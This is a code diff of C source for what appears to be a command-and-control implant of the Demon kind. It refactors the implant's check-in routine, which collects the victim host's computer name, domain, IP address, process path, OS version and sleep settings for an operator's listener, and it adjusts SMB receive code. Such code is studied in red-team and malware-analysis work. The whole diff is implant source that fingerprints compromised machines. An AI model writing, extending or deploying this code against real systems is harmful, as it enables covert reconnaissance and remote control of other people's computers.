@@ -28,6 +28,8 @@ BOOL TransportInit( PPACKAGE Package )
     SIZE_T           Length     = 0;
     BOOL             Initialize = FALSE;
 
+    PUTS( "Transport Init connection with listener." )
+
     if ( ! Package )
     {
         Package    = PackageCreate( DEMON_INITIALIZE );
@@ -97,6 +99,7 @@ BOOL TransportInit( PPACKAGE Package )
     DATA_FREE( Data, Length );
 
     // Get Domain
+    Length = 0;
     if ( ! Instance->Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &Length ) )
     {
         if ( ( Data = Instance->Win32.LocalAlloc( LPTR, Length ) ) )
@@ -106,26 +109,23 @@ BOOL TransportInit( PPACKAGE Package )
     DATA_FREE( Data, Length );
 
     Instance->Win32.GetAdaptersInfo( NULL, &Length );
+    if ( ( Adapter = Instance->Win32.LocalAlloc( LPTR, Length ) ) )
     {
-        if ( ( Adapter = Instance->Win32.LocalAlloc( LPTR, Length ) ) )
+        if ( Instance->Win32.GetAdaptersInfo( Adapter, &Length ) == NO_ERROR )
         {
-            if ( Instance->Win32.GetAdaptersInfo( Adapter, &Length ) == NO_ERROR )
-            {
-                MemCopy( IPAddr, Adapter->IpAddressList.IpAddress.String, 17 );
-                PackageAddBytes( Package, IPAddr, 17 );
+            PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, 16 );
 
-                MemSet( Adapter, 0, Length );
-                Instance->Win32.LocalFree( Adapter );
-                Adapter = NULL;
-            }
-            else
-                PackageAddInt32( Package, 0 );
+            MemSet( Adapter, 0, Length );
+            Instance->Win32.LocalFree( Adapter );
+            Adapter = NULL;
         }
         else
             PackageAddInt32( Package, 0 );
     }
+    else
+        PackageAddInt32( Package, 0 );
 
-
+    // Get Process Path
     Length = ( ( PRTL_USER_PROCESS_PARAMETERS ) Instance->ThreadEnvBlock->ProcessEnvironmentBlock->lpProcessParameters )->ImagePathName.Length;
     if ( ( Data = Instance->Win32.LocalAlloc( LPTR, Length ) ) )
     {
@@ -151,6 +151,7 @@ BOOL TransportInit( PPACKAGE Package )
     PackageAddInt32( Package, OsVersions.wProductType );
     PackageAddInt32( Package, OsVersions.wServicePackMajor );
     PackageAddInt32( Package, OsVersions.dwBuildNumber );
+
     PackageAddInt32( Package, Instance->Session.OS_Arch );
 
     PackageAddInt32( Package, Instance->Config.Sleeping );
@@ -425,9 +426,9 @@ LEAVE:
 #endif
 }
 
+#ifdef TRANSPORT_SMB
 PVOID TransportRecv( PSIZE_T Size )
 {
-#ifdef TRANSPORT_SMB
     PVOID Response    = NULL;
     DWORD BytesSize   = 0;
     DWORD DemonId     = 0;
@@ -471,5 +472,5 @@ PVOID TransportRecv( PSIZE_T Size )
     }
 
     return Response;
-#endif
 }
+#endif
